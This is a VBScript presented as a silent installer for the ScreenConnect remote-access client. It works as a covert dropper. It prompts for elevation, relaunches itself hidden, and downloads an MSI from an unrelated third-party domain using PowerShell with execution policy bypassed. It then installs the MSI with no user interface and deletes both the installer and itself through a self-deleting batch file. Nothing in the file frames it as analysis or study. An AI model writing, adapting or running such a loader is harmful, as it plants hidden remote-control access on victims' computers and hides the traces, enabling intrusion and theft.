' =============================================
' ScreenConnect Client Silent Installer
' Fixed - Proper installation with msiexec
' =============================================

Option Explicit

Dim objShell, objFSO, objWshShell, objWMIService, objExec
Dim strScriptPath, strTempFolder, strMsiPath, strMsiURL
Dim strElevationFlag, strArgs, intRetry, objProcess
Dim colProcesses, strInstallCmd, intExitCode

' --- Initialize objects ---
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objWshShell = WScript.CreateObject("WScript.Shell")

' --- Get script path ---
strScriptPath = WScript.ScriptFullName

' --- Check if running as administrator ---
If Not IsAdministrator() Then
    ' Elevate and restart
    strElevationFlag = "--elevated"
    strArgs = ""
    
    ' Preserve command line arguments
    If WScript.Arguments.Count > 0 Then
        Dim i
        For i = 0 To WScript.Arguments.Count - 1
            strArgs = strArgs & " """ & WScript.Arguments(i) & """"
        Next
    End If
    
    ' Run with elevated privileges (using ShellExecute with runas)
    objShell.ShellExecute "wscript.exe", """" & strScriptPath & """" & strArgs & " " & strElevationFlag, "", "runas", 1
    
    ' Exit current non-elevated instance
    WScript.Quit
End If

' --- Hide console (VBScript doesn't have console by default, but we minimize) ---
Dim strHost
strHost = LCase(WScript.FullName)
If InStr(strHost, "cscript") > 0 Then
    ' Hide console window
    objShell.Run "cmd.exe /c title " & Chr(34) & " " & Chr(34), 0, False
    WScript.Sleep 100
End If

' --- Check if already hidden/re-run ---
Dim blnHidden
blnHidden = False

If WScript.Arguments.Named.Exists("HIDE") Then
    blnHidden = True
End If

' If not hidden, re-launch minimized
If Not blnHidden Then
    Dim strRestartArgs
    strRestartArgs = ""
    If WScript.Arguments.Count > 0 Then
        Dim j
        For j = 0 To WScript.Arguments.Count - 1
            strRestartArgs = strRestartArgs & " """ & WScript.Arguments(j) & """"
        Next
    End If
    
    ' Launch minimized with HIDE flag
    objShell.Run "wscript.exe """ & strScriptPath & """" & strRestartArgs & " /HIDE:TRUE", 0, False
    WScript.Quit
End If

' --- Main execution ---
strTempFolder = objFSO.GetSpecialFolder(2) ' Temporary folder
strMsiPath = strTempFolder & "\ScreenConnect.ClientSetup.msi"
strMsiURL = "https://hlstoryland.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"

' --- Download MSI silently using PowerShell with better error handling ---
Dim strPSCmd, objExecPS, strOutput, intRetryCount
Dim blnDownloadSuccess

blnDownloadSuccess = False
intRetryCount = 0

' Try download up to 3 times
Do While intRetryCount < 3 And Not blnDownloadSuccess
    ' Delete existing file if any
    If objFSO.FileExists(strMsiPath) Then
        On Error Resume Next
        objFSO.DeleteFile strMsiPath, True
        On Error GoTo 0
    End If
    
    ' PowerShell download command with better error handling
    strPSCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
               """$ProgressPreference='SilentlyContinue'; " & _
               "try { " & _
               "  Invoke-WebRequest -Uri '" & strMsiURL & "' -OutFile '" & strMsiPath & "' -ErrorAction Stop; " & _
               "  exit 0 " & _
               "} catch { " & _
               "  exit 1 " & _
               "}"""
    
    ' Execute download
    Set objExecPS = objShell.Exec(strPSCmd)
    objExecPS.StdOut.ReadAll() ' Wait for completion
    objExecPS.StdErr.ReadAll()
    
    ' Wait for file to appear
    WScript.Sleep 2000
    
    ' Check if download succeeded
    If objFSO.FileExists(strMsiPath) Then
        Dim objFile, lngFileSize
        Set objFile = objFSO.GetFile(strMsiPath)
        lngFileSize = objFile.Size
        
        If lngFileSize > 10240 Then ' File larger than 10KB (valid MSI)
            blnDownloadSuccess = True
        Else
            ' File too small, delete and retry
            On Error Resume Next
            objFSO.DeleteFile strMsiPath, True
            On Error GoTo 0
            intRetryCount = intRetryCount + 1
            WScript.Sleep 2000
        End If
    Else
        intRetryCount = intRetryCount + 1
        WScript.Sleep 2000
    End If
Loop

' --- Install MSI silently if download succeeded ---
If blnDownloadSuccess And objFSO.FileExists(strMsiPath) Then
    ' Install MSI with proper msiexec command
    strInstallCmd = "msiexec /i """ & strMsiPath & """ /qn /norestart /quiet /log """ & strTempFolder & "\ScreenConnect_install.log"""
    
    ' Execute installation
    Dim objInstallExec
    Set objInstallExec = objShell.Exec(strInstallCmd)
    
    ' Wait for installation to complete
    Do While objInstallExec.Status = 0
        WScript.Sleep 500
        ' Check if msiexec is still running
        Dim colProcesses2, objProcess2
        Set colProcesses2 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2").ExecQuery("SELECT Name FROM Win32_Process WHERE Name='msiexec.exe'")
        If colProcesses2.Count = 0 Then
            Exit Do
        End If
    Loop
    
    ' Wait additional 5 seconds for installation to complete
    WScript.Sleep 5000
    
    ' Get exit code
    intExitCode = objInstallExec.ExitCode
    
    ' Delete MSI file after installation (success or failure)
    On Error Resume Next
    If objFSO.FileExists(strMsiPath) Then
        objFSO.DeleteFile strMsiPath, True
    End If
    On Error GoTo 0
    
    ' Check if installation succeeded
    If intExitCode = 0 Then
        ' Installation successful
    Else
        ' Installation failed, but we already deleted the MSI
        ' Could log error here
    End If
Else
    ' Download failed, clean up any partial file
    If objFSO.FileExists(strMsiPath) Then
        On Error Resume Next
        objFSO.DeleteFile strMsiPath, True
        On Error GoTo 0
    End If
End If

' --- Self-delete script ---
' Create a temporary batch file to delete this VBS script
Dim strSelfDeletePath
strSelfDeletePath = objFSO.GetSpecialFolder(2) & "\selfdelete_" & Int((99999 - 10000 + 1) * Rnd + 10000) & ".bat"

Dim objSelfDelFile
Set objSelfDelFile = objFSO.CreateTextFile(strSelfDeletePath, True)

' Write self-delete commands
objSelfDelFile.WriteLine "@echo off"
objSelfDelFile.WriteLine "timeout /t 2 /nobreak > nul"
objSelfDelFile.WriteLine "del /f /q """ & strScriptPath & """ 2>nul"
objSelfDelFile.WriteLine "del /f /q """ & strSelfDeletePath & """ 2>nul"
objSelfDelFile.WriteLine "exit"

objSelfDelFile.Close

' Launch self-delete batch file and exit
objShell.Run """" & strSelfDeletePath & """", 0, False

' Exit
WScript.Quit

' =============================================
' --- FUNCTIONS ---
' =============================================

' --- Check if running as administrator ---
Function IsAdministrator()
    On Error Resume Next
    Dim objWMIService, colItems, objItem, strUser
    Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("SELECT Name FROM Win32_ComputerSystem")
    
    For Each objItem In colItems
        ' If we can query WMI, we're likely elevated
        IsAdministrator = True
        Exit Function
    Next
    
    ' Fallback method
    Dim objNet, strTestPath
    Set objNet = CreateObject("WScript.Network")
    On Error Resume Next
    
    ' Try to access a protected folder
    strTestPath = objFSO.GetSpecialFolder(1) & "\test_" & Int(Rnd * 10000) & ".tmp"
    objFSO.CreateTextFile strTestPath, True
    
    If Err.Number = 0 Then
        objFSO.DeleteFile strTestPath, True
        IsAdministrator = True
    Else
        IsAdministrator = False
    End If
    
    On Error GoTo 0
End Function

' --- Wait for process to exit ---
Sub WaitForProcess(processName, timeoutSeconds)
    Dim objWMIService2, colProcesses2, objProcess2
    Dim startTime
    startTime = Now
    
    Do While DateDiff("s", startTime, Now) < timeoutSeconds
        Set objWMIService2 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
        Set colProcesses2 = objWMIService2.ExecQuery("SELECT Name FROM Win32_Process WHERE Name='" & processName & "'")
        
        If colProcesses2.Count = 0 Then
            Exit Do
        End If
        
        WScript.Sleep 500
    Loop
End Sub